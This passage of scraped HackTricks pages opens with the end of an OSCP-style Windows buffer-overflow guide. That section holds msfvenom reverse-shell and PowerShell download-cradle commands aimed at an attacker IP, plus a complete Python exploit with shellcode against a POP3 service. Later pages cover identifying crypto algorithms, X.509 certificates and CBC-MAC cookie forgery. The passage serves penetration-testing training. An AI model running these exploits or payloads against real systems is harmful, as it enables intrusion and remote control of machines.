c\\xfd\\xfe\\xff\"\n)\nbuffer = 'A'*2606 + 'BBBB' + badchars\nThe badchars starts in 0x01 because 0x00 is almost always bad.\nExecute repeatedly the exploit with this new buffer delenting the chars that are found to be useless:.\nFor example:\nIn this case you can see that\nyou shouldn't use the char 0x0A\n(nothing is saved in memory since the char 0x09).\nIn this case you can see that\nthe char 0x0D is avoided\n:\nFind a JMP ESP as a return address\nUsing:\n!mona modules    #Get protections, look for all false except last one (Dll of SO)\nYou will\nlist the memory maps\n. Search for some DLl that has:\nRebase: False\nSafeSEH: False\nASLR: False\nNXCompat: False\nOS Dll: True\nNow, inside this memory you should find some JMP ESP bytes, to do that execute:\n!mona find -s \"\\xff\\xe4\" -m name_unsecure.dll # Search for opcodes insie dll space (JMP ESP)\n!mona find -s \"\\xff\\xe4\" -m slmfc.dll # Example in this case\nThen, if some address is found, choose one that don't contain any badchar:\nIn this case, for example: _0x5f4a358f\n_\nCreate shellcode\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.41 LPORT=443 -f c -b '\\x00\\x0a\\x0d'\nmsfvenom -a x86 --platform Windows -p windows/exec CMD=\"powershell \\\"IEX(New-Object Net.webClient).downloadString('http://10.11.0.41/nishang.ps1')\\\"\" -f python -b '\\x00\\x0a\\x0d'\nIf the exploit is not working but it should (you can see with ImDebg that the shellcode is reached), try to create other shellcodes (msfvenom with create different shellcodes for the same parameters).\nAdd some NOPS at the beginning\nof the shellcode and use it and the return address to JMP ESP, and finish the exploit:\n#!/usr/bin/python\n‚Äã\nimport\nsocket\n‚Äã\ns\n=\nsocket.socket\n(\nsocket.AF_INET, socket.SOCK_STREAM\n)\nip\n=\n'10.11.25.153'\nport\n=\n110\n‚Äã\nshellcode\n=\n(\n\"\n\\xb8\\x30\\x3f\\x27\\x0c\\xdb\\xda\\xd9\\x74\\x24\\xf4\\x5d\\x31\\xc9\\xb1\n\"\n\"\n\\x52\\x31\\x45\\x12\\x83\\xed\\xfc\\x03\\x75\\x31\\xc5\\xf9\\x89\\xa5\\x8b\n\"\n\"\n\\x02\\x71\\x36\\xec\\x8b\\x94\\x07\\x2c\\xef\\xdd\\x38\\x9c\\x7b\\xb3\\xb4\n\"\n\"\n\\x57\\x29\\x27\\x4e\\x15\\xe6\\x48\\xe7\\x90\\xd0\\x67\\xf8\\x89\\x21\\xe6\n\"\n\"\n\\x7a\\xd0\\x75\\xc8\\x43\\x1b\\x88\\x09\\x83\\x46\\x61\\x5b\\x5c\\x0c\\xd4\n\"\n\"\n\\x4b\\xe9\\x58\\xe5\\xe0\\xa1\\x4d\\x6d\\x15\\x71\\x6f\\x5c\\x88\\x09\\x36\n\"\n\"\n\\x7e\\x2b\\xdd\\x42\\x37\\x33\\x02\\x6e\\x81\\xc8\\xf0\\x04\\x10\\x18\\xc9\n\"\n\"\n\\xe5\\xbf\\x65\\xe5\\x17\\xc1\\xa2\\xc2\\xc7\\xb4\\xda\\x30\\x75\\xcf\\x19\n\"\n\"\n\\x4a\\xa1\\x5a\\xb9\\xec\\x22\\xfc\\x65\\x0c\\xe6\\x9b\\xee\\x02\\x43\\xef\n\"\n\"\n\\xa8\\x06\\x52\\x3c\\xc3\\x33\\xdf\\xc3\\x03\\xb2\\x9b\\xe7\\x87\\x9e\\x78\n\"\n\"\n\\x89\\x9e\\x7a\\x2e\\xb6\\xc0\\x24\\x8f\\x12\\x8b\\xc9\\xc4\\x2e\\xd6\\x85\n\"\n\"\n\\x29\\x03\\xe8\\x55\\x26\\x14\\x9b\\x67\\xe9\\x8e\\x33\\xc4\\x62\\x09\\xc4\n\"\n\"\n\\x2b\\x59\\xed\\x5a\\xd2\\x62\\x0e\\x73\\x11\\x36\\x5e\\xeb\\xb0\\x37\\x35\n\"\n\"\n\\xeb\\x3d\\xe2\\x9a\\xbb\\x91\\x5d\\x5b\\x6b\\x52\\x0e\\x33\\x61\\x5d\\x71\n\"\n\"\n\\x23\\x8a\\xb7\\x1a\\xce\\x71\\x50\\x2f\\x04\\x79\\x89\\x47\\x18\\x79\\xd8\n\"\n\"\n\\xcb\\x95\\x9f\\xb0\\xe3\\xf3\\x08\\x2d\\x9d\\x59\\xc2\\xcc\\x62\\x74\\xaf\n\"\n\"\n\\xcf\\xe9\\x7b\\x50\\x81\\x19\\xf1\\x42\\x76\\xea\\x4c\\x38\\xd1\\xf5\\x7a\n\"\n\"\n\\x54\\xbd\\x64\\xe1\\xa4\\xc8\\x94\\xbe\\xf3\\x9d\\x6b\\xb7\\x91\\x33\\xd5\n\"\n\"\n\\x61\\x87\\xc9\\x83\\x4a\\x03\\x16\\x70\\x54\\x8a\\xdb\\xcc\\x72\\x9c\\x25\n\"\n\"\n\\xcc\\x3e\\xc8\\xf9\\x9b\\xe8\\xa6\\xbf\\x75\\x5b\\x10\\x16\\x29\\x35\\xf4\n\"\n\"\n\\xef\\x01\\x86\\x82\\xef\\x4f\\x70\\x6a\\x41\\x26\\xc5\\x95\\x6e\\xae\\xc1\n\"\n\"\n\\xee\\x92\\x4e\\x2d\\x25\\x17\\x7e\\x64\\x67\\x3e\\x17\\x21\\xf2\\x02\\x7a\n\"\n\"\n\\xd2\\x29\\x40\\x83\\x51\\xdb\\x39\\x70\\x49\\xae\\x3c\\x3c\\xcd\\x43\\x4d\n\"\n\"\n\\x2d\\xb8\\x63\\xe2\\x4e\\xe9\n\"\n)\n‚Äã\nbuffer\n=\n'A'\n*\n2606\n+\n'\\x8f\\x35\\x4a\\x5f'\n+\n\"\n\\x90\n\"\n*\n8\n+ shellcode\ntry:\nprint\n\"\n\\n\nLaunching exploit...\"\ns.connect\n((\nip\n,\nport\n))\ndata\n=\ns.recv\n(\n1024\n)\ns.send\n(\n'USER username'\n+\n'\\r\\n'\n)\ndata\n=\ns.recv\n(\n1024\n)\ns.send\n(\n'PASS '\n+ buffer +\n'\\r\\n'\n)\nprint\n\"\n\\n\nFinished!.\"\nexcept:\nprint\n\"Could not connect to \"\n+ip+\n\":\"\n+port\nThere are shellcodes that will\noverwrite themselves\n, therefore it's important to always add some NOPs before the shellcode\nImproving the shellcode\nAdd this parameters:\nEXITFUNC=thread -e x86/shikata_ga_nai\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nPwnTools\nNext\n- Crypto & Stego\nCryptographic/Compression Algorithms\nLast modified\n6mo ago"
    },
    {
        "title": "Cryptographic/Compression Algorithms",
        "url": "https://book.hacktricks.xyz/crypto-and-stego/cryptographic-algorithms",
        "text": "Cryptographic/Compression Algorithms\nCryptographic/Compression Algorithms\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nIdentifying Algorithms\nIf you ends in a code\nusing shift rights and lefts, xors and several arithmetic operations\nit's highly possible that it's the implementation of a\ncryptographic algorithm\n. Here it's going to be showed some ways to\nidentify the algorithm that it's used without needing to reverse each step\n.\nAPI functions\nCryptDeriveKey\nIf this function is used, you can find which\nalgorithm is being used\nchecking the value of the second parameter:\nCheck here the table of possible algorithms and their assigned values:\nhttps://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id\n‚Äã\nRtlCompressBuffer/RtlDecompressBuffer\nCompresses and decompresses a given buffer of data.\nCryptAcquireContext\nThe\nCryptAcquireContext\nfunction is used to acquire a handle to a particular key container within a particular cryptographic service provider (CSP).\nThis returned handle is used in calls to CryptoAPI\nfunctions that use the selected CSP.\nCryptCreateHash\nInitiates the hashing of a stream of data. If this function is used, you can find which\nalgorithm is being used\nchecking the value of the second parameter:\nCheck here the table of possible algorithms and their assigned values:\nhttps://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id\n‚Äã\nCode constants\nSometimes it's really easy to identify an algorithm thanks to the fact that it needs to use a special and unique value.\nIf you search for the first constant in Google this is what you get:\nTherefore, you can assume that the decompiled function is a\nsha256 calculator.\nYou can search any of the other constants and you will obtain (probably) the same result.\ndata info\nIf the code doesn't have any significant constant it may be\nloading information from the .data section\n.\nYou can access that data,\ngroup the first dword\nand search for it in google as we have done in the section before:\nIn this case, if you look for\n0xA56363C6\nyou can find that it's related to the\ntables of the AES algorithm\n.\nRC4\n(Symmetric Crypt)\nCharacteristics\nIt's composed of 3 main parts:\nInitialization stage/\n: Creates a\ntable of values from 0x00 to 0xFF\n(256bytes in total, 0x100). This table is commonly call\nSubstitution Box\n(or SBox).\nScrambling stage\n: Will\nloop through the table\ncrated before (loop of 0x100 iterations, again) creating modifying each value with\nsemi-random\nbytes. In order to create this semi-random bytes, the RC4\nkey is used\n. RC4\nkeys\ncan be\nbetween 1 and 256 bytes in length\n, however it is usually recommended that it is above 5 bytes. Commonly, RC4 keys are 16 bytes in length.\nXOR stage\n: Finally, the plain-text or cyphertext is\nXORed with the values created before\n. The function to encrypt and decrypt is the same. For this, a\nloop through the created 256 bytes\nwill be performed as many times as necessary. This is usually recognized in a decompiled code with a\n%256 (mod 256)\n.\nIn order to identify a RC4 in a disassembly/decompiled code you can check for 2 loops of size 0x100 (with the use of a key) and then a XOR of the input data with the 256 values created before in the 2 loops probably using a %256 (mod 256)\nInitialization stage/Substitution Box:\n(Note the number 256 used as counter and how a 0 is written in each place of the 256 chars)\nScrambling Stage:\nXOR Stage:\nAES (Symmetric Crypt)\nCharacteristics\nUse of\nsubstitution boxes and lookup tables\nIt's possible to\ndistinguish AES thanks to the use of specific lookup table values\n(constants).\nNote that the\nconstant\ncan be\nstored\nin the binary\nor created\ndynamically\n.\nThe\nencryption key\nmust be\ndivisible\nby\n16\n(usually 32B) and usually an\nIV\nof 16B is used.\nSBox constants\nSerpent\n(Symmetric Crypt)\nCharacteristics\nIt's rare to find some malware using it but there are examples (Ursnif)\nSimple to determine if an algorithm is Serpent or not based on it's length (extremely long function)\nIdentifying\nIn the following image notice how the constant\n0x9E3779B9\nis used (note that this constant is also used by other crypto algorithms like\nTEA\n-Tiny Encryption Algorithm).\nAlso note the\nsize of the loop\n(\n132\n) and the\nnumber of XOR operations\nin the\ndisassembly\ninstructions and in the\ncode\nexample:\nAs it was mentioned before, this code can be visualized inside any decompiler as a\nvery long function\nas there\naren't jumps\ninside of it. The decompiled code can look like the following:\nTherefore, it's possible to identify this algorithm checking the\nmagic number\nand the\ninitial XORs\n, seeing a\nvery long function\nand\ncomparing\nsome\ninstructions\nof the long function\nwith an implementation\n(like the shift left by 7 and the rotate left by 22).\nRSA\n(Asymmetric Crypt)\nCharacteristics\nMore complex than symmetric algorithms\nThere are no constants! (custom implementation are difficult to determine)\nKANAL (a crypto analyzer) fails to show hints on RSA ad it relies on constants.\nIdentifying by comparisons\nIn line 11 (left) there is a\n+7) >> 3\nwhich is the same as in line 35 (right):\n+7) / 8\nLine 12 (left) is checking if\nmodulus_len < 0x040\nand in line 36 (right) it's checking if\ninputLen+11 > modulusLen\nMD5 & SHA (hash)\nCharacteristics\n3 functions: Init, Update, Final\nSimilar initialize functions\nIdentify\nInit\nYou can identify both of them checking the constants. Note that the sha_init has 1 constant that MD5 doesn't have:\nMD5 Transform\nNote the use of more constants\nCRC (hash)\nSmaller and more efficient as it's function is to find accidental changes in data\nUses lookup tables (so you can identify constants)\nIdentify\nCheck\nlookup table constants\n:\nA CRC hash algorithm looks like:\nAPLib (Compression)\nCharacteristics\nNot recognizable constants\nYou can try to write the algorithm in python and search for similar things online\nIdentify\nThe graph is quiet large:\nCheck\n3 comparisons to recognise it\n:\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nReversing & Exploiting -\nPrevious\nWindows Exploiting (Basic Guide - OSCP lvl)\nNext\nUnpacking binaries\nLast modified\n6mo ago"
    },
    {
        "title": "Certificates",
        "url": "https://book.hacktricks.xyz/crypto-and-stego/certificates",
        "text": "Certificates\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nWhat is a Certificate\nIn cryptography, a\npublic key certificate,\nalso known as a\ndigital certificate\nor\nidentity certificate,\nis an electronic document used to prove the ownership of a public key. The certificate includes information about the key, information about the identity of its owner (called the subject), and the digital signature of an entity that has verified the certificate's contents (called the issuer). If the signature is valid, and the software examining the certificate trusts the issuer, then it can use that key to communicate securely with the certificate's subject.\nIn a typical\npublic-key infrastructure\n(PKI) scheme, the certificate issuer is a\ncertificate authority\n(CA), usually a company that charges customers to issue certificates for them. By contrast, in a\nweb of trust\nscheme, individuals sign each other's keys directly, in a format that performs a similar function to a public key certificate.\nThe most common format for public key certificates is defined by\nX.509\n. Because X.509 is very general, the format is further constrained by profiles defined for certain use cases, such as\nPublic Key Infrastructure (X.509)\nas defined in RFC 5280.\nx509 Common Fields\nVersion Number:\nVersion of x509 format.\nSerial Number\n: Used to uniquely identify the certificate within a CA's systems. In particular this is used to track revocation information.\nSubject\n: The entity a certificate belongs to: a machine, an individual, or an organization.\nCommon Name\n: Domains affected by the certificate. Can be 1 or more and can contain wildcards.\nCountry (C)\n: Country\nDistinguished name (DN)\n: The whole subject:\nC=US, ST=California, L=San Francisco, O=Example, Inc., CN=shared.global.example.net\nLocality (L)\n: Local place\nOrganization (O)\n: Organization name\nOrganizational Unit (OU)\n: Division of an organisation (like \"Human Resources\").\nState or Province (ST, S or P)\n: List of state or province names\nIssuer\n: The entity that verified the information and signed the certificate.\nCommon Name (CN)\n: Name of the certificate authority\nCountry (C)\n: Country of the certificate authority\nDistinguished name (DN)\n: Distinguished name of the certificate authority\nLocality (L)\n: Local place where the organisation can be found.\nOrganization (O)\n: Organisation name\nOrganizational Unit (OU)\n: Division of an organisation (like \"Human Resources\").\nNot Before\n: The earliest time and date on which the certificate is valid. Usually set to a few hours or days prior to the moment the certificate was issued, to avoid\nclock skew\nproblems.\nNot After\n: The time and date past which the certificate is no longer valid.\nPublic Key\n: A public key belonging to the certificate subject. (This is one of the main parts as this is what is signed by the CA)\nPublic Key Algorithm\n: Algorithm used to generate the public key. Like RSA.\nPublic Key Curve\n: The curve used by the elliptic curve public key algorithm (if apply). Like nistp521.\nPublic Key Exponent\n: Exponent used to derive the public key (if apply). Like 65537.\nPublic Key Size\n: The size of the public key space in bits. Like 2048.\nSignature Algorithm\n: The algorithm used to sign the public key certificate.\nSignature\n: A signature of the certificate body by the issuer's private key.\nx509v3 extensions\nKey Usage\n: The valid cryptographic uses of the certificate's public key. Common values include digital signature validation, key encipherment, and certificate signing.\nIn a Web certificate this will appear as a\nX509v3 extension\nand will have the value\nDigital Signature\nExtended Key Usage\n: The applications in which the certificate may be used. Common values include TLS server authentication, email protection, and code signing.\nIn a Web certificate this will appear as a\nX509v3 extension\nand will have the value\nTLS Web Server Authentication\nSubject Alternative Name:\nAllows users to specify additional host\nnames\nfor a single SSL\ncertificate\n. The use of the SAN extension is standard practice for SSL certificates, and it's on its way to replacing the use of the common\nname\n.\nBasic Constraint:\nThis extension describes whether the certificate is a CA certificate or an end entity certificate. A CA certificate is something that signs certificates of others and a end entity certificate is the certificate used in a web page for example (the last par of the chain).\nSubject Key Identifier\n(SKI): This extension declares a unique\nidentifier\nfor the public\nkey\nin the certificate. It is required on all CA certificates. CAs propagate their own SKI to the Issuer\nKey Identifier\n(AKI) extension on issued certificates. It's the hash of the subject public key.\nAuthority Key Identifier\n: It contains a key identifier which is derived from the public key in the issuer certificate. It's the hash of the issuer public key.\nAuthority Information Access\n(AIA): This extension contains at most two types of information :\nInformation about\nhow to get the issuer of this certificate\n(CA issuer access method)\nAddress of the\nOCSP responder from where revocation of this certificate\ncan be checked (OCSP access method).\nCRL Distribution Points\n: This extension identifies the location of the CRL from which the revocation of this certificate can be checked. The application that processes the certificate can get the location of the CRL from this extension, download the CRL and then check the revocation of this certificate.\nCT Precertificate SCTs\n: Logs of Certificate transparency regarding the certificate\nDifference between OCSP and CRL Distribution Points\nOCSP\n(RFC 2560) is a standard protocol that consists of an\nOCSP client and an OCSP responder\n. This protocol\ndetermines revocation status of a given digital public-key certificate\nwithout\nhaving to\ndownload\nthe\nentire CRL\n.\nCRL\nis the\ntraditional method\nof checking certificate validity. A\nCRL provides a list of certificate serial numbers\nthat have been revoked or are no longer valid. CRLs let the verifier check the revocation status of the presented certificate while verifying it. CRLs are limited to 512 entries.\nFrom\nhere\n.\nWhat is Certificate Transparency\nCertificate Transparency aims to remedy certificate-based threats by\nmaking the issuance and existence of SSL certificates open to scrutiny by domain owners, CAs, and domain users\n. Specifically, Certificate Transparency has three main goals:\nMake it impossible (or at least very difficult) for a CA to\nissue a SSL certificate for a domain without the certificate being visible to the owner\nof that domain.\nProvide an\nopen auditing and monitoring system that lets any domain owner or CA determine whether certificates have been mistakenly or maliciously\nissued.\nProtect users\n(as much as possible) from being duped by certificates that were mistakenly or maliciously issued.\nCertificate Logs\nCertificate logs are simple network services that maintain\ncryptographically assured, publicly auditable, append-only records of certificates\n.\nAnyone can submit certificates to a log\n, although certificate authorities will likely be the foremost submitters. Likewise, anyone can query a log for a cryptographic proof, which can be used to verify that the log is behaving properly or verify that a particular certificate has been logged. The number of log servers doesn‚Äôt have to be large (say, much less than a thousand worldwide), and each could be operated independently by a CA, an ISP, or any other interested party.\nQuery\nYou can query the logs of Certificate Transparency of any domain in\nhttps://crt.sh/\n.\nFormats\nThere are different formats that can be used to store a certificate.\nPEM Format\nIt is the most common format used for certificates\nMost servers (Ex: Apache) expects the certificates and private key to be in a separate files\n- Usually they are Base64 encoded ASCII files\n- Extensions used for PEM certificates are .cer, .crt, .pem, .key files\n- Apache and similar server uses PEM format certificates\nDER Format\nThe DER format is the binary form of the certificate\nAll types of certificates & private keys can be encoded in DER format\nDER formatted certificates do not contain the \"BEGIN CERTIFICATE/END CERTIFICATE\" statements\nDER formatted certificates most often use the ‚Äò.cer‚Äô and '.der' extensions\nDER is typically used in Java Platforms\nP7B/PKCS#7 Format\nThe PKCS#7 or P7B format is stored in Base64 ASCII format and has a file extension of .p7b or .p7c\nA P7B file only contains certificates and chain certificates (Intermediate CAs), not the private key\nThe most common platforms that support P7B files are Microsoft Windows and Java Tomcat\nPFX/P12/PKCS#12 Format\nThe PKCS#12 or PFX/P12 format is a binary format for storing the server certificate, intermediate certificates, and the private key in one encryptable file\nThese files usually have extensions such as .pfx and .p12\nThey are typically used on Windows machines to import and export certificates and private keys\nFormats conversions\nConvert x509 to PEM\nopenssl x509 -in certificatename.cer -outform PEM -out certificatename.pem\nConvert PEM to DER\nopenssl x509 -outform der -in certificatename.pem -out certificatename.der\nConvert DER to PEM\nopenssl x509 -inform der -in certificatename.der -out certificatename.pem\nConvert PEM to P7B\nNote:\nThe PKCS#7 or P7B format is stored in Base64 ASCII format and has a file extension of .p7b or .p7c. A P7B file only contains certificates and chain certificates (Intermediate CAs), not the private key. The most common platforms that support P7B files are Microsoft Windows and Java Tomcat.\nopenssl crl2pkcs7 -nocrl -certfile certificatename.pem -out certificatename.p7b -certfile CACert.cer\nConvert PKCS7 to PEM\nopenssl pkcs7 -print_certs -in certificatename.p7b -out certificatename.pem\nConvert pfx to PEM\nNote:\nThe PKCS#12 or PFX format is a binary format for storing the server certificate, intermediate certificates, and the private key in one encryptable file. PFX files usually have extensions such as .pfx and .p12. PFX files are typically used on Windows machines to import and export certificates and private keys.\nopenssl pkcs12 -in certificatename.pfx -out certificatename.pem\nConvert PFX to PKCS#8\nNote:\nThis requires 2 commands\n1- Convert PFX to PEM\nopenssl pkcs12 -in certificatename.pfx -nocerts -nodes -out certificatename.pem\n2- Convert PEM to PKCS8\nopenSSL pkcs8 -in certificatename.pem -topk8 -nocrypt -out certificatename.pk8\nConvert P7B to PFX\nNote:\nThis requires 2 commands\n1-\nConvert P7B to CER\nopenssl pkcs7 -print_certs -in certificatename.p7b -out certificatename.cer\n2- Convert CER and Private Key to PFX\nopenssl pkcs12 -export -in certificatename.cer -inkey privateKey.key -out certificatename.pfx -certfile  cacert.cer\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nUnpacking binaries\nNext\n- Crypto & Stego\nCipher Block Chaining CBC-MAC\nLast modified\n2mo ago"
    },
    {
        "title": "Cipher Block Chaining CBC-MAC",
        "url": "https://book.hacktricks.xyz/crypto-and-stego/cipher-block-chaining-cbc-mac-priv",
        "text": "Cipher Block Chaining CBC-MAC\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nCBC\nIf the\ncookie\nis\nonly\nthe\nusername\n(or the first part of the cookie is the username) and you want to impersonate the username \"\nadmin\n\". Then, you can create the username\n\"bdmin\"\nand\nbruteforce\nthe\nfirst byte\nof the cookie.\nCBC-MAC\nIn cryptography, a\ncipher block chaining message authentication code\n(\nCBC-MAC\n) is a technique for constructing a message authentication code from a block cipher. The message is encrypted with some block cipher algorithm in CBC mode to create a\nchain of blocks such that each block depends on the proper encryption of the previous block\n. This interdependence ensures that a\nchange\nto\nany\nof the plaintext\nbits\nwill cause the\nfinal encrypted block\nto\nchange\nin a way that cannot be predicted or counteracted without knowing the key to the block cipher.\nTo calculate the CBC-MAC of message m, one encrypts m in CBC mode with zero initialization vector and keeps the last block. The following figure sketches the computation of the CBC-MAC of a message comprising blocks\nusing a secret key k and a block cipher E:\nCBC-MAC structure (en).svg\nVulnerability\nWith CBC-MAC usually the\nIV used is 0\n.\nThis is a problem because 2 known messages (\nm1\nand\nm2\n) independently will generate 2 signatures (\ns1\nand\ns2\n). So:\nE(m1 XOR 0) = s1\nE(m2 XOR 0) = s2\nThen a message composed by m1 and m2 concatenated (m3) will generate 2 signatures (s31 and s32):\nE(m1 XOR 0) = s31 = s1\nE(m2 XOR s1) = s32\nWhich is possible to calculate without knowing the key of the encryption.\nImagine you are encrypting the name\nAdministrator\nin\n8bytes\nblocks:\nAdminist\nrator\\00\\00\\00\nYou can create a username called\nAdminist\n(m1) and retrieve the signature (s1).\nThen, you can create a username called the result of\nrator\\00\\00\\00 XOR s1\n. This will generate\nE(m2 XOR s1 XOR 0)\nwhich is s32.\nnow, you can use s32 as the signature of the full name\nAdministrator\n.\nSummary\n1.\nGet the signature of username\nAdminist\n(m1) which is s1\n2.\nGet the signature of username\nrator\\x00\\x00\\x00 XOR s1 XOR 0\nis s32**.**\n3.\nSet the cookie to s32 and it will be a valid cookie for the user\nAdministrator\n.\nAttack Controlling IV\nIf you can control the used IV the attack could be very easy.\nIf the cookies is just the username encrypted, to impersonate the user \"\nadministrator\n\" you can create the user \"\nAdministrator\n\" and you will get it's cookie.\nNow, if you can control the IV, you can change the first Byte of the IV so\nIV[0] XOR \"A\" == IV'[0] XOR \"a\"\nand regenerate the cookie for the user\nAdministrator.\nThis cookie will be valid to\nimpersonate\nthe user\nadministrator\nwith the initial\nIV\n.\nReferences\nMore information in\nhttps://en.wikipedia.org/wiki/CBC-MAC\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nCrypto & Stego -\nPrevious\nCertificates\nNext\n- Crypto & Stego\nCrypto CTFs Tricks\nLast modified\n6mo ago"
    },
    {
        "title": "Crypto CTFs Tricks",
        "url": "https://book.hacktricks.xyz/crypto-and-stego/crypto-ctfs-tricks",
        "text": "Crypto CTFs Tricks\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nOnline Hashes DBs\nGoogle 